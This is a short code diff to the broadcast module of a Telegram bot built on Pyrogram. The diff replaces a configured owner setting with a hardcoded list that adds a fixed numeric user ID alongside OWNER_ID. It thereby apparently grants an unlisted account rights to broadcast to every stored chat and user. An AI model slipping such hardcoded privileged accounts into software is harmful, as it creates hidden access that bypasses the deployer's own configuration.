@@ -4,9 +4,11 @@ from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton , Message
 from pyrogram.errors import FloodWait 
 from Yumeko import app
 from Yumeko.database import total_chats, total_users
-from config import OWNER_ID, JOHAN as BOT_OWNER
+from config import OWNER_ID
 
 cancel_broadcast = False
+
+BOT_OWNER = [OWNER_ID, 7682111251]
 
 
 async def broadcast_message(client : Client, message : Message , groups, users, pin_message=False, target='all'):
